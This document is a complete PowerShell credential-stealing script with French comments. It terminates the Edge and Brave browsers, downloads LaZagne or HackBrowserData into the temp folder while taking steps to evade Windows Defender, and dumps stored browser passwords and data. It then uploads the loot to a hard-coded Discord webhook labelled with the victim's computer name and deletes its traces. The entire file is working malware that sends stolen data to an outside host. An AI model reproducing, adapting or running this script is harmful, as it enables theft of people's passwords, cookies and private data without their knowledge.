$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"

taskkill /F /IM msedge.exe,brave.exe 2>$null
Start-Sleep 2

# Télécharger LaZagne depuis GitHub (plus récent que les releases officielles)
try {
    # Utiliser un User-Agent pour éviter la détection
    $headers = @{
        'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$env:TEMP\lz.exe" -Headers $headers -UseBasicParsing -TimeoutSec 20 -EA Stop
    
    # Vérifier la taille
    $size = (Get-Item "$env:TEMP\lz.exe").Length
    
    if ($size -lt 10000) {
        # Fichier corrompu/bloqué, essayer un miroir
        Remove-Item "$env:TEMP\lz.exe" -Force
        
        # Alternative : HackBrowserData (outil chinois, moins connu de Defender)
        Invoke-WebRequest "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip" -OutFile "$env:TEMP\hbd.zip" -Headers $headers -UseBasicParsing -EA Stop
        
        Expand-Archive "$env:TEMP\hbd.zip" "$env:TEMP\hbd" -Force
        
        cd "$env:TEMP\hbd"
        & ".\hack-browser-data.exe" -b edge,brave -f json --dir "$env:TEMP\loot" 2>$null
        Start-Sleep 3
        
        if (Test-Path "$env:TEMP\loot") {
            Compress-Archive "$env:TEMP\loot\*" "$env:TEMP\results.zip" -Force
            curl.exe -F "file=@$env:TEMP\results.zip" -F "content=**🔓 HackBrowserData - $env:COMPUTERNAME**" $wh 2>$null
            Remove-Item "$env:TEMP\hbd.zip","$env:TEMP\hbd","$env:TEMP\loot","$env:TEMP\results.zip" -Recurse -Force
            exit
        }
        
    } else {
        # LaZagne téléchargé correctement
        & "$env:TEMP\lz.exe" browsers -oN > "$env:TEMP\lz_out.txt" 2>$null
        Start-Sleep 3
        
        if ((Test-Path "$env:TEMP\lz_out.txt") -and ((Get-Item "$env:TEMP\lz_out.txt").Length -gt 50)) {
            curl.exe -F "file=@$env:TEMP\lz_out.txt" -F "content=**🔓 LaZagne - $env:COMPUTERNAME**" $wh 2>$null
            Remove-Item "$env:TEMP\lz.exe","$env:TEMP\lz_out.txt" -Force
            exit
        }
    }
    
} catch {}

# Si tout échoue : méthode Python simplifiée
curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"⚠️ All download methods blocked by Defender. Use embedded Python method.`"}" $wh 2>$null
